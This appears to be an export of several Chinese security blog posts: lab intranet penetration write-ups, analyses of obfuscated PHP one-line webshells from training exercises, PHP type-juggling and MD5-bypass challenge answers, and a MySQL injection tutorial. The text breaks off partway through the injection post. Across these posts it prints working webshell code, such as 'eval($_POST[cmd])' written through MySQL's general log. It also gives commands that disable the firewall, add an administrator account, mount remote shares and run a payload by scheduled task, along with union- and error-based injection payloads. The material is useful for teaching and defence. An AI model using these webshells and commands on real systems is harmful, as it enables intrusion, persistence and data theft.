说一下实验环境： Kali（192.168.70.128）和 Win7（192.168.70.129）都在192.168.70段 模拟内网的2K3和Win2008都在192.168.140段 开始实验之前不要忘记开启Win7里面的phpStudy 开始实验： 访问Web image-20200309171619751 出现这个界面有两个思路： 19年phpStudy的RCE（本文未利用） phpmyadmin写shell 但是不着急，这个靶场做出来肯定还有其他地方可利用 通过扫描目录，发现了网站的备份文件和cms站点 image-20200309172128569 image-20200309172203571 查看下载的备份文件，发现了管理员账号密码 image-20200309172759886 image-20200309172808314 尝试登录看看 ，用网上说的弱口令也是错的（难道我这靶场被人动了手脚？？？） image-20200309172902009 返回phpmyadmin，弱口令登录 image-20200309173156872 这里可以利用mysql的错误日志写shell 具体代码(之前的文章中有讲到) show variables like &apos;%general%&apos;; #查看配置set global general_log = on; #开启general log 模式set global general_log_file = &apos;path&apos;; #设置日志目录为shell地址select &apos;&lt;?php eval($_POST[cmd]);?&gt;&apos; 写入shell 这里关于上面的代码要说一点，如果能写入但文件不存在(404)，可能是在设置shell的地址的时候存在被转义的情况 利用这个地方上传了一个msf生成的php马，但是功能有点少，执行命令也出现了问题，所以后续又上传了exe马和php大马(执行exe文件) 接收到信息 image-20200309174904839 权限已经是system，直接获取账号密码 image-20200309175103168 查看域环境 image-20200309175520773 获取到内网ip段 192.168.140.* 开启3389 image-20200309175138132 image-20200309175301509 利用rdestop进行远程登陆，因为这里win7系统是开着的，没办法登进去（以前不是可以直接挤下去嘛？？） 获取到内网ip段后添加路由 image-20200309180147083 但这样只能在msf里对内网环境进行测试，所以设置代理，让其他工具也可以访问到内网 use auxiliary/server/socks4a image-20200309180522910 vim /etc/proxychains.conf打开之后在下面加入socks4 127.0.0.1 yourPort image-20200309180802697 接下来就可以用nmap来扫描内网环境了 proxychains nmap -T4 -vv -Pn -sT 192.168.140.139//-Pn -sT 是必须加的//不用nmap的话msf里面的扫描模块也是可以的，上篇文章有讲到 效果图 image-20200309181128345 开了445端口，存在ms17010但是无法回弹 //不回弹但可以直接执行命令use auxiliary/admin/smb/ms17_010_command 为了后续操作，这里把防火墙关掉 //关防火墙netsh advfirewall set allprofiles state off//添加用户net user admin password /addnet localgroup administrators admin /add 返回之前的session 因为知道了目标机器的账号密码，可以利用445端口对远程磁盘进行挂载，方便木马传输 net use \\\\192.168.140.139\\ipc$ password /user:username 远程磁盘进行挂载net use k: \\\\192.168.140.139\\c$查看目标机器时间 方便执行任务计划net time \\\\ip image-20200309184326525 利用任务计划执行我们上传的马子 at \\\\192.168.140.139 19:40 c:\\\\shell.exe image-20200309193416123 获取本地密码、开启3389 image-20200309193528315 image-20200309193726821 就到这里，没什么技术含量，大牛勿喷（表哥求带） 本人撰写的文章，仅供学习和研究使用，请勿使用文中的技术用于非法用途，任何人造成的任何负面影响，与本人无关。","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://13l00m.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"内网","slug":"内网","permalink":"https://13l00m.github.io/tags/%E5%86%85%E7%BD%91/"},{"name":"渗透","slug":"渗透","permalink":"https://13l00m.github.io/tags/%E6%B8%97%E9%80%8F/"},{"name":"MSF","slug":"MSF","permalink":"https://13l00m.github.io/tags/MSF/"}]},{"title":"【靶机】记一次简单的内网渗透测试","slug":"【靶机】记一次简单的内网渗透测试","date":"2020-03-07T12:53:02.000Z","updated":"2020-03-07T13:23:53.102Z","comments":true,"path":"2020/03/07/【靶机】记一次简单的内网渗透测试/","link":"","permalink":"https://13l00m.github.io/2020/03/07/%E3%80%90%E9%9D%B6%E6%9C%BA%E3%80%91%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/","excerpt":"","text":"开始之前先说一下实验环境： 两台物理机（物理机里面存有虚拟机） win10 存在kali 虚拟机 ip都在192.168.1.* 网段 2k3 存在2k3 虚拟机 物理机在192.168.1.* 网段 虚拟机在192.168.159.*网段（提供内网环境） 两台物理机可互相ping通，kali虚拟机也可以ping通2k3物理机，2k3虚拟机只能由2k3物理机ping通（这么说可以理解吧） 漏洞环境就简单处理了，主要是想记录一下如何利用2k3外网服务器做跳板间接连通内网服务器继续进行测试 2k3物理机ip：192.168.1.2 2k3虚拟机ip：192.168.159.139 win10物理机ip：192.168.1.3 kali虚拟机ip：192.168.1.123 开始实验： 访问 192.168.1.2 file 进行目录扫描： file 每个目录访问一遍 file 这靶场大家应该都玩过了，上传个小马（就当上传漏洞了），目录里面还有一个phpmyadmin 这个一会儿进行作跳板的时候会用到。避免重复呢，我就直接上传个小马 file file 利用msf生成木马（用msf回弹主要是需要添加路由） file 在msf模块监听设置好的端口 file file 用之前传的小马+蚁剑虚拟终端打开上传的shell123.exe msf 可以检测到回传 file 利用内置模块检测可以连通的内网网段 file 已知内网机器是在192.168.159.0/24段的，我就不卖关子直接添加路由了（route add 也是可以的） file 查看添加路由情况 file 接下来利用msf 进行内网网段中存活主机的扫描 file 已知内网ip在139 我就缩小一下范围，节约时间 file 成功检测到139开放80端口 但这个时候直接访问是不可行的，接下来进行端口映射 回到刚才的Session file 利用 portfwd 进行端口映射将内网中的80端口映射到kali机中的80端口访问http://localhost file 访问成功为了方便拿shell，这里就用phpmyadmin弱口令直接进去了 根据phpinfo文件提供的绝对路径，修改sql的日志存储绝对路径就可以构造后门php文件 file show variables like &apos;%general%&apos;; #查看配置set global general\\_log = on; #开启general log 模式set global general_log_file = &apos;D:\\phpstudy\\PHPTutorial\\WWW&apos;; #设置日志目录为shell地址select &quot;payload&quot; 写入shell 这里可能是我的配置问题，小马回传到msf的时候会收到但是直接断掉，所以直接上传了个大马 file 上传dama.exe可以正常收到回弹信息 本人撰写的文章，仅供学习和研究使用，请勿使用文中的技术用于非法用途，任何人造成的任何负面影响，与本人无关。","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://13l00m.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"内网","slug":"内网","permalink":"https://13l00m.github.io/tags/%E5%86%85%E7%BD%91/"},{"name":"渗透","slug":"渗透","permalink":"https://13l00m.github.io/tags/%E6%B8%97%E9%80%8F/"},{"name":"MSF","slug":"MSF","permalink":"https://13l00m.github.io/tags/MSF/"}]},{"title":"PHP恶意代码分析","slug":"PHP恶意代码分析","date":"2019-11-28T01:58:50.000Z","updated":"2019-11-28T04:15:08.280Z","comments":true,"path":"2019/11/28/PHP恶意代码分析/","link":"","permalink":"https://13l00m.github.io/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/","excerpt":"","text":"墨者学院–WebShell代码分析溯源(第11题) &lt;?php if(!empty($_GET[1]) &amp;&amp; $_GET[1]=='GET.fPZ87') &#123; $_=@fopen('t.php', 'a'); @fwrite($_,\"&lt;?php \\$_=str_replace('ilo','ass',str_replace('vey','ert',\\$_GET[2]));@\\$_(\\$_POST[1]);?&gt;\"); @fclose($_);&#125;?&gt; 程序分析 if(!empty($_GET[1]) &amp;&amp; $_GET[1]=='GET.fPZ87') //判断通过GET方式参数1是否为空 且 参数值是否为 GET.fPZ87 $_= @fopen('t.php','a');// 打开一个新文件 t.php ,模式 a 为写入内容不覆盖//分析构造的一句话&lt;?php \\$_=str_replace('ilo','ass',str_replace('vey','ert',\\$_GET[2])); @\\$_(\\$_POST[1]); ?&gt; 变量 $_ 由 $_GET[2] 通过GET方式传入数据，再由嵌套替换决定最后的内容 \\$_ 与 \\$_GET[2] 前面的 \\ 是转义用的 str_replace(待匹配字符,待替换字符,待匹配字符串) 所以呢，最后拼接的一句话为： assert($_POST[1]) //当然 要完成这种拼接，$_GET[2]需要传入的值为：ilovey $_POST[1]需要传入的值为：需要执行的php代码 实战 墨者学院–WebShell代码分析溯源(第10题) &lt;?phperror_reporting(0);$e = $_REQUEST['e'];declare(ticks=1);register_tick_function ($e, $_REQUEST['GET']);?&gt; 程序分析 php declare (ticks = N)关于什么是低级语句&lt;?phperror_reporting(0); //尽管程序出错也不会报错$e = $_REQUEST['e']; // 接收参数declare(ticks=1); //php官方文档对ticks的定义 ：//A tick is an event that occurs for every N low-level tickable statements executed by the parser within the declare block. The value for N is specified using ticks=N within the declare block's directive section.||Tick（时钟周期）是一个在 declare 代码段中解释器每执行 N 条可计时的低级语句就会发生的事件。N 的值是在 declare 中的 directive 部分用ticks=N 来指定的. 我个人理解的大意就是说, tick 这个周期上会绑定一个事件, 这个事件, 当Zend引擎执行到所设置的 tick (就是N) 行低级语句时, 就执行 register_tick_function() 定义的事件 因为这里只涉及到如何利用register_tick_function()函数进行构造代码执行，暂不深究 register_tick_function ($e, $_REQUEST['GET']);register_tick_function(函数名,给函数传入的值)如果要构造远程代码执行的话：register_tick_function('assert','command')?&gt; 实战 墨者学院–WebShell代码分析溯源(第9题) &lt;?phperror_reporting(0);$e = $_REQUEST['e'];register_shutdown_function($e, $_REQUEST['REQUEST']);?&gt; 程序分析 register_shutdown_function()&lt;?phperror_reporting(0); //不报错$e = $_REQUEST['e'];// $_REQUEST[] POST、GET都可传入参数register_shutdown_function($e, $_REQUEST['REQUEST']);前面已经po出了register_shutdown_function()函数的应用环境，在这里就简单说一下register_shutdown_function(待执行的函数名,向函数里面传入的值)//这里依然用 assert 进行构造代码执行当PHP程序执行完成后，自动执行register_shutdown_function函数，该函数需要一个参数，用来指定由谁处理这些后续的工作。其中，程序执行完成，分为以下几种情况: 第一种：php代码执行过程中发生错误 第二种：php代码顺利执行成功 第三种：php代码运行超时 第四种：页面被用户强制停止?&gt; 实战 墨者学院–WebShell代码分析溯源(第8题) &lt;?php$e = $_REQUEST['e'];$arr = array($_POST['pass'] =&gt; '|.*|e',);array_walk($arr, $e, '');?&gt; 程序分析 array_walk() preg_replace()&lt;?php$e = $_REQUEST['e'];$arr = array($_POST['pass'] =&gt; '|.*|e',);上面定义数组的意思是,通过$_POST['pass']传入数组元素的键名,'|.*|e'为该键键值php定义数组也可以直接输入键值 -&gt; $arr = array(键值1,键值2,键值3);如果php数组里面上述两种情况都出现''' &lt;?php function test($a,$b)&#123; echo \"$a,$b&lt;/br&gt;\"; &#125; $a = array(1,\"qian\"=&gt;\"hou\",2,3,4); 1,2,3,4相对应的键名不会因为第二个元素的出现发生改变 查看如何输出可以将代码执行 array_walk($a,'test'); ?&gt;'''array_walk($arr, $e, '');array_walk(array,function,userdata...) array_walk(数组名（一个元素的键名与键值当作右侧函数的第二、第一个参数）,定义的函数名,传入的第三个参数) 利用array_wlak传参的功能，借助 preg_replace() 可导致代码执行preg_replace()： preg_replace 函数执行一个正则表达式的搜索和替换当开启 /e 模式时，通过正则表达式匹配到的数据会先通过php代 码的方式执行 preg_replace ($pattern(正则表达式及相应的模式),$replacement(待匹配数据),$subject(待替换数据))整体流程分析 $e = $_REQUEST['e']; 通过REQUEST['e'] 传入 preg_replace() 函数 $arr = array($_POST['pass'] =&gt; '|.*|e',); 通过 POST 传入 将要执行的php代码,将该函数与正则表达 式'|.*|e' array_walk($arr, $e, ''); -&gt; array($arr,preg_replace(),'') // 第三个参数是将匹配到的字符替换为 '' 一定要记住第一个参数(数组)传入的键名与键值分别当作传入函数的第二参数与第一参数, preg_replace 的第二参数才 可以导致代码执行，第一参数用来匹配字符。 如果传入的代码匹配不完整会导致命令无法执行?&gt; 墨者学院–WebShell代码分析溯源(第7题) &lt;?phperror_reporting(0);$e = $_REQUEST['e'];$arr = array('test', $_REQUEST['POST']);uasort($arr, base64_decode($e));?&gt; 程序分析 uasort(Array,MyFunction)利用python进行base64加密&lt;?phperror_reporting(0);$e = $_REQUEST['e']; // 传入可执行代码的函数，需要base64编码$arr = array('test', $_REQUEST['POST']);//向数组中添加一个元素（待执行php命令）uasort($arr, base64_decode($e));uasort(传入的数组,编码后的执行函数) uasort 将数组传入函数中(参数2)进行重新整合（整合情况根据函数内容决定），在整合过程中会造成php代码执行 base64编码可利用python内置base64模块进行编码 base64.b64encode('待编码字符串'.encode('urf8')) 综上 传入与构造的语句应为： e = base64.b64encode('assert'.encode()) -&gt;YXNzZXJ0 (e = YXNzZXJ0) $_REQUEST['POST'] = phpinfo() //证明可执行代码即可 $arr = ('test','phpinfo()') uasort($arr,'assert') -&gt; 将'test','phpinfo()' 分别传入assert，遇到phpinfo() 进行代码执行?&gt; 墨者学院–WebShell代码分析溯源(第6题) &lt;?phperror_reporting(0);$e = $_REQUEST['e'];$arr = array($_POST['POST'],);array_map(base64_decode($e), $arr);?&gt; 程序分析 array_map(MyFunction,Array)&lt;?php error_reporting(0);$e = $_REQUEST['e'];$arr = array($_POST['POST'],);//前面都是些老生常谈的东西，在这里就不细说了array_map(base64_decode($e), $arr);array_map(Function,Array) Function 里面有对数组元素内容自定义的操作，传入函数时元素值若为php可执行代码，则会导致代码执行如何用python将字符串加密上面说过了 接下来构造传参导致代码执行 e = YXNzZXJ0('assert' base64编码后的内容) POST(POST方式) = phpinfo() //可证明代码执行即可?&gt; 墨者学院–WebShell代码分析溯源(第5题) &lt;?phperror_reporting(0);call_user_func('assert', $_REQUEST['assert']);?&gt; 程序分析 call_user_func(MyFunction,待传入参数)&lt;?phperror_reporting(0);call_user_func('assert', $_REQUEST['assert']);call_user_func(MyFunction,待传入的参数) ''' &lt;?php function test($a)&#123; echo $a; &#125; @call_user_func('test',$_POST[cmd]); //test为自定义参数,通过POST传入的参数即运行结果 ?&gt;'''既然能够调用任意函数，当然也能调用可执行代码的危险函数 assert 因为代码中已经存在 assert 所以在这里直接传入待执行的命令就好 assert = phpinfo() 这里通过REQUEST传入，POST、GET都可以?&gt; 墨者学院–WebShell代码分析溯源(第4题) &lt;?phperror_reporting(0);$e=$_REQUEST['e'];$arr=array($_POST['POST'],);array_filter($arr,base64_decode($e));?&gt; 程序分析 array_filter(Array,MyFunction) &lt;?phperror_reporting(0);$e=$_REQUEST['e'];$arr=array($_POST['POST'],);array_filter($arr,base64_decode($e));array_filter 的作用是将数组内元素传入待定的函数中，若函数返回值为True则数组元素保留，返回False则不保留 ''' &lt;?php function test_odd($var) &#123; return $var&gt;2; // $var的值如果&lt;2 返回False &#125; $a1=array(\"a\",\"b\",2,3,4); print_r(array_filter($a1,\"test_odd\")); ?&gt; '''//程序运行结果会很直观的解释 array_filter 的作用 有传参的过程，函数名可控，参数可控 则可构造代码执行语句 e 依旧传入assert的base64编码 YXNzZXJ0 POST 传值为 phpinfo()?&gt; 墨者学院–WebShell代码分析溯源(第3题) &lt;?phperror_reporting(0);$g = array('','s');$gg = a.$g[1].ser.chr('116');@$gg($_POST[get]);?&gt; 程序分析 &lt;?phperror_reporting(0);$g = array('','s');$gg = a.$g[1].ser.chr('116'); //chr 为ASCII的解码 116对应的解码内容为：t //所以$gg = assert@$gg($_POST[get]); // 这里直接传想执行的代码即可?&gt; 墨者学院–WebShell代码分析溯源(第2题) &lt;?php $POST['POST']='assert';$array[]=$POST;$array[0]['POST']($_POST['assert']);?&gt; 程序分析 &lt;?php $POST['POST']='assert'; //将键名：POST 键值：assert 的一个数组元素放入 $POST 数组内$array[]=$POST; // 将数组 $POST 放入 数组 $array 里面构造一个二维数组$array[0]['POST']($_POST['assert']); 这里的$array[0]['POST']即 'assert' 所以该一句话木马最终构造为: assert($_POST['assert']) 通过POST传入待执行的php命令?&gt; 墨者学院–WebShell代码分析溯源(第1题) &lt;?phperror_reporting(0);$_GET['POST']($_POST['GET']);?&gt; 程序分析 &lt;?phperror_reporting(0);$_GET['POST']($_POST['GET']); //利用POST、GET传值，直接构造可执行语句即可POST = assertGET = phpinfo()?&gt; PHP代码分析溯源(第4题)&lt;?phpeval(gzinflate(base64_decode(&amp;40pNzshXSFCJD3INDHUNDolOjE2wtlawt+MCAA==&amp;)));?&gt; 程序分析 base64+gzinflate压缩编码（加密）文件&lt;?phpeval(gzinflate(base64_decode(&amp;40pNzshXSFCJD3INDHUNDolOjE2wtlawt+MCAA==&amp;)));gzinflate(base64_decode()) 用来解密base64+压缩编码处理后的字符串如果想看到编码内容 可以将eval替换为echo（在本题中适用，正常情况下大多需要密码进行解密） echo 的编码内容为：echo `$_REQUEST[a]`;; ?&gt; php 中的 ` (反引号)内的字符串当作系统命令执行 echo 会将命令执行的结果输出（如果没有 echo 命令照样执行） ?&gt; PHP代码分析溯源(第3题) &lt;?phperror_reporting(0); function noother_says_correct($number) &#123; $one = ord('1'); 49 $nine = ord('9'); 57 for ($i = 0; $i &lt; strlen($number); $i++) &#123; $digit = ord($number&#123;$i&#125;); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123; return false; &#125; &#125; return $number == '54975581388'; &#125;if(noother_says_correct($_POST['pass']))&#123; /** 此处省略 **/&#125; else&#123; echo '&lt;script&gt;alert(\\'认证错误\\');window.location.href=\\'/index.html\\';&lt;/script&gt;';&#125;?&gt; 程序分析 php字符串与数字比较的不同方法&lt;?phperror_reporting(0); function noother_says_correct($number) &#123; $one = ord('1'); 49 $nine = ord('9'); 57 for ($i = 0; $i &lt; strlen($number); $i++) &#123; $digit = ord($number&#123;$i&#125;); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123; return false; &#125; &#125; return $number == '54975581388'; // 这里必须是双等号，三等号不支持上述HEX比较方法 &#125;if(noother_says_correct($_POST['pass']))&#123; /** 此处省略 **/&#125; else&#123; echo '&lt;script&gt;alert(\\'认证错误\\');window.location.href=\\'/index.html\\';&lt;/script&gt;';&#125;?&gt; 在这解释一下程序的运行逻辑： 自定函数 noother_says_correct() 判断传入的值是否等于54975581388 且每个位数上面的数字是否否和 for 循环里 面的判断条件（每位数&lt;1&amp;&amp;&gt;9）正常输入key是不可能符合条件的。但是呢 php在变量与数字比较过程中可以通过HEX进 行比较 即 54975581388 = 0xccccccccc 这样就会符合条件 可以拿到flag PHP代码分析溯源(第2题) &lt;?phperror_reporting(0);$a1 = md5('QNKCDZO');$a = @$_POST['pass'];$a2 = @md5($a);if(isset($a))&#123; if ($a != 'QNKCDZO' &amp;&amp; $a1 == $a2) &#123; echo \"flag\"; exit(); &#125; else &#123; echo '&lt;script&gt;alert(\\'认证错误\\');window.location.href=\\'/index.html\\';&lt;/script&gt;';&#125;&#125;?&gt; 程序分析 MD5加密绕过&lt;?phperror_reporting(0);$a1 = md5('QNKCDZO'); //$a1 = 0e830400451993494058024219903391$a = @$_POST['pass'];$a2 = @md5($a); //$a2 = 通过pass传入数据通过MD5加密后的值if(isset($a))&#123; if ($a != 'QNKCDZO' &amp;&amp; $a1 == $a2) &#123; echo \"flag\"; //双等号在进行比较时传入的数据(0e……)会作为科学计数法进行运算-&gt;0 exit(); //所以传入一个前面也为0e的md5数据即可得到flag &#125; else &#123; echo '&lt;script&gt;alert(\\'认证错误\\');window.location.href=\\'/index.html\\';&lt;/script&gt;';&#125;&#125;?&gt;总结0e开头的md5未加密数据： QNKCDZO 240610708 aabg7XSs s878926199a aabC9RqS PHP代码分析溯源(第1题)php变种一句话&lt;?php @$_++; $__=(\"`\"^\"?\").(\":\"^\"&#125;\").(\"%\"^\"`\").(\"&#123;\"^\"/\"); $___=(\"$\"^\"&#123;\").(\"~\"^\".\").(\"/\"^\"`\").(\"-\"^\"~\").(\"(\"^\"|\"); $&#123;$__&#125;[!$_]($&#123;$___&#125;[$_]);?&gt; 程序分析 &lt;?php @$_++; //未传入数据的变量初始化为0 $_++ -&gt; 1 $__=(\"`\"^\"?\").(\":\"^\"&#125;\").(\"%\"^\"`\").(\"&#123;\"^\"/\"); $___=(\"$\"^\"&#123;\").(\"~\"^\".\").(\"/\"^\"`\").(\"-\"^\"~\").(\"(\"^\"|\");'''$__、$___ 通过异或运算最终的结果分别为：_GET、_POST最后构造的一句话为：$&#123;_GET&#125;[!1]($&#123;_POST&#125;[1])传参进行命令执行 0(!1=0)=assert(GET)、1=whoami(POST)''' $&#123;$__&#125;[!$_]($&#123;$___&#125;[$_]);?&gt;","categories":[{"name":"php代码审计","slug":"php代码审计","permalink":"https://13l00m.github.io/categories/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"php","slug":"php","permalink":"https://13l00m.github.io/tags/php/"},{"name":"代码审计","slug":"代码审计","permalink":"https://13l00m.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"web安全","slug":"web安全","permalink":"https://13l00m.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"mysql注入漏洞方法及原理整理","slug":"mysql注入漏洞方法及原理整理","date":"2019-11-28T01:37:38.000Z","updated":"2019-11-29T07:19:29.876Z","comments":true,"path":"2019/11/28/mysql注入漏洞方法及原理整理/","link":"","permalink":"https://13l00m.github.io/2019/11/28/mysql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%96%B9%E6%B3%95%E5%8F%8A%E5%8E%9F%E7%90%86%E6%95%B4%E7%90%86/","excerpt":"","text":"数据库注入漏洞类型整理写在开始 由于不同注入方法确定注入点后的获取相应数据方法相同，这里就统一写在一个地方 文章内容出现过的函数解释为自己所理解的，并不是最全的函数解释 最开始的是最详细的也是最基础的，避免重复,后面的只有原理代码和修复方案 下面说的所有注入他们的注入方法都不是固定的，要根据实际情况进行注入 sql注入基础确定注入点在进行黑盒测试的过程中，常用于确定注入点的方法 and 1=2–+# //对应的后端代码$id = $_GET['id'];$sql = \"select * from users where id =$id\"; http://localhost/?id=1 属于正常查询 返回正常页面 http://localhost/?iid=1 and 1=1 返回正常页面 http://localhost/?id=1 and 1=2 返回错误页面 对应后端处理代码生成sql语句:select * from admin where id=1;查询失败的sql语句:select * from admin where id =1 and 1=2; 原理解释 当在sql语句后面添加 and 1=2 / and 1=1 的时候 其中的 1=1 相当于 True 1=2 相当于 False and 相当于 且所以 当 and 前面的查询语句成立时 and 1=1 可返回正常内容 and 1=2 则返错误内容 ​ ‘ //对应的后端代码$id = $_GET['id'];$sql = \"select * from users where id='$id'\"; http://localhost/?id=1 属于正常查询 返回正常页面 http://localhost/?iid=1&#39; –+返回正常页面 http://localhost/?id=1&#39; 返回错误页面 对应后端处理代码生成sql语句:select * from admin where id = &apos;1&apos;查询失败的sql语句:select * from admin where id =&apos;1&apos;&apos; 原理解释 当多输入一个单引号(&apos;) 时，最后一个单引号未闭合导致报错为了进一步判断网站是否存在注入漏洞，通常再单引号后面加注释符(&apos;--+)来注释掉未闭合的单引号如果返回正常页面，则可以确定注入点 【解释】为什么加 and 1=1 或 and 1=2 都返回正常界面sql语言中，字符型与非字符型比较：如果字符串开始存在整形数据（2admin）则拿出来比较的字符串为2如果不存在整形数据，默认为0例子:select 1=&apos;1admin&apos;; 返回1select 1=&apos;admin&apos;; 返回0 “ //对应的后端代码$id = $_GET['id'];$sql = 'select * from users where id=\"$id\"'; 原理和上述相同，不复述 ‘) //对应的后端代码$id = $_GET['id'];$sql = \"select * from admin where id =('$id')\"; 原理和上述相同，不复述 “) //对应的后端代码$id = $_GET['id'];$sql = 'select * from admin where id =(\"$id\")'; 原理和上述相同，不复述 【经验】确定存在注入的情况下，快速判断为上述哪种类型在参数后面加 \\ 如果存在报错，大多可以爆出该参数的接收类型 上面说了最基础的确定注入点的方法，下面说一下如何利用漏洞获取数据库里面的信息 漏洞利用获取数据库信息1、获取字段信息 在参数后面加 order by +一个数字 eg: http://localhost/?id=1 order by 4 这里利用 order by 判断字段数量的原理 order by 在sql语句中用于指定字段列数排序，当输入的字段数大于实际最大字段数时，会产生报错。 所以利用 order by 可以判断某个数据表中的最大字段数 报错信息如下： Unknown column &apos;11&apos; in &apos;order clause&apos;2、获取字段相应出现的位置 在第一步中已经获得了一个最大字段数，接下来利用 union select 1,2,3,4……,最大字段数 来判断每个字段相对位置 利用 union select 获取相应信息的原理: union select 在sql语句中的作用是进行联合查询 例子： 两个数据表，每个数据表有相应的条件在进行数据输出 的过程中可用union select进行两个表的拼接 mysql&gt; select * from admin where id=1;+------+----------+----------+| id | username | password |+------+----------+----------+| 1 | admin | admin |+------+----------+----------+mysql&gt; select * from testt where id=1;+------+----------+----------+| id | username | password |+------+----------+----------+| 1 | testt | testt |+------+----------+----------+mysql&gt; select * from admin where id=1 union select * from testt;+------+----------+----------+| id | username | password |+------+----------+----------+| 1 | admin | admin || 1 | testt | testt |+------+----------+----------+ 因为两个数据表的字段最大值相同，所以会正常输出，如果不同则会报错(如下) The used SELECT statements have a different number of columns union select 不仅仅能拼接字段相同的表，还可以拼接字段相同的任意数据 mysql&gt; select * from admin where id=1 union select 1,2,3;+------+----------+----------+| id | username | password |+------+----------+----------+| 1 | admin | admin || 1 | 2 | 3 |+------+----------+----------+ 当把sql语句输入到网站参数后面：http://localhost/?id=1 union select 1,2,3时 该网站后端程序仍返回正常数据 原因：就像上述表的查询相同，前后两个查询条件都为True，id=1的条件成立，所以网站返回正常内容，当构造的 id！=True时，数据表返回的内容只有 union select 之后的数据mysql&gt; select * from admin where id=-1 union select 1,2,3;+------+----------+----------+| id | username | password |+------+----------+----------+| 1 | 2 | 3 |+------+----------+----------+ 当网页参数构造的id为False（-1） 则返回的内容为union select 进行拼接的内容 如：http://localhost/?id=-1 union select 1,2,3 返回值为 2 说明 username 这个字段在第二个位置，且 可以利用这个字段获取数据库里面的所有信息 3、获取当前的数据库名、数据库版本信息、数据库当前用户等 利用第二步拼接语句 union select 获取db名 http://localhost/?id=-1 union select 1,database(),3 获取db版本信息 http://localhost/?id=-1 union select 1,version(),3 获取db当前用户 http://localhost/?id=-1 union select 1,user(),3 database(),version(),user() 都是数据库里面的内置函数，想进一步了解去百度 这里解释一下，为什么这些函数不放在1和3这两个位置： 因为第二步中的 union select 1,2,3 网页回显的信息只有2字段的数据信息，所以在进行获取数据的过程中，只 能利用2这个位置，实战中选择一个可以回显的数据字段即可，没有固定要求 4、获取所有数据库名（限制mysql版本&gt;=5.0） sql语句： select group_concat(schema_name) from information_schema.schemata; 解释为什么用 group_concat(): 正常情况下查询出来的数据不止有一行，所以需要group_concat把多行数据拼接到一行里面 limit 可以替换 group_concat() sql语言中的limit可以控制输出 limit 参数1,参数2 参数2 表示输出几行数据 参数1 表示输出第几块数据（块分多少由参数2控制） 所以相应的sql语句可以写为： select schema_name from information_schema.schemata limit 0,1 from 的作用 from的作用也就是他的直译来自(哪个数据库) from information_schema 就是选择 information_schema 这个数据库 . 的作用 information_schema.schemata中的 . 就是 information_schema 下的一个表 information_schema 与 schemata 可理解为父子关系 一定要注意 information_schema 只有mysql版本&gt;=5.0才有，若小于这个版本，只能利用最基本的方法获取数据5、获取当前数据库所有表名 sql语句: select group_concat(table_name) from information_schema.tables where table_schema=&apos;数据库名&apos;; where的作用是查询的条件，table_schema 为该表其中一个字段名不必深究为什么写这个（背背背） 其他的跟第四步重复，不再复述6、获取表的字段名 sql语句: select group_concat(column_name) from information_schema.columns where table_name=&apos;表名&apos;;7、获取字段信息 sql语句： select group_concat(字段1，字段2，字段3) from 数据库名.表名 这就是一套比较基础 完整的sql注入漏洞利用方法及过程 常见的sql注入漏洞类型报错注入updatexml()函数报错注入UPDATEXML(XML_document, XPath_string, new_value); 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。 第三个参数：new_value，String格式，替换查找到的符合条件的数据 作用：改变文档中符合条件的节点的值 报错原理：Xpath格式语法书写错误的话，就会报错 更好的理解updatexml updatexml的第二个参数相当于正常sql语句中的from where，都可以从大量数据中提取出特定想要的数据，我猜测这就是可以能够执行sql语句的原因（为什么能够执行sql语句我也不清楚，可能需要查看底层源码才能知晓）如何获取数据库里面的信息呢 select updatexml(1,concat(0x7e,database()),1) concat() 用于拼接输出结果 select concat(1,2) -&gt; 输出结果为：12 这里为了在实战中方便找到返回的数据用了 concat()。真实情况写不写都可以返回数据，不是一成不变的 死格式 0x7e为 ~ 的十六进制 sql语言在查询过程中可用想查询字符串的十六进制带替字符串，避免单、双引号混乱造成程序问题上面已经获取到库名，该如何获取其他数据上面已经说的很详细了，这里不复述 extractvalue()函数报错注入Extractvalue(xml_frag,xpath_expr)xml_frag: 目标xml文档xpath_expr: 利用Xpath路径法表示的查找路径报错原理：Xpath格式语法书写错误的话，就会报错因为extractvalue()与updatexml()都是对xml文件进行操作，通过报错获取数据的原理相似，这里不再复述简单说一下如何构造sql语句进行获取数据库信息select extractvalue(1,concat(0x7e,database())); floor()函数报错注入Mysql报错注入原理分析(count()、rand()、group by) 获取数据库: select 1,2,3 from (select count(*),concat((select concat(version(),0x3a,0x3a,database(),0x3a,0x3a,user(),0x3a) limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a 语句中的floor(rand(0)*2)是什么意思？是为了产生一个不唯一的且能会出现重复的数字。rand()函数产生的数会随机 产生0到1的小数，而加上参数变成rand(0)的时候，会产生一个确定的小数（我的理解） 所以，rand(0)是为了得到一个确定的数，也就是执行第几次就是什么数据（我自己的理解），而*2再floor是为了得 到唯一的整数数据,将floor得到的数据范围限定在[0,1]之间 再说报错，报了什么错呢，是主键重复，为什么会主键重复呢?这就group by 和 count(*)有关了，我们先看count(*) 和group by组合一起的效果 结果会显示每个列的次数，而这个列的内容，是唯一的主键。而在查询过程中，是先建立一张虚拟表，一行一行插入的， 而插入时已经有重复主键了，那么，就会报错。当然，可能会问了，重复时，count(*)就加1了，为什么会主键重复呢？ 这就和rand()函数有关了，官方文档中提到，rand()函数在进行GROUP BY查询时会被计算多次，这里列举参考文档的解 释,我觉得说的很清楚： 1.查询前默认会建立空虚拟表 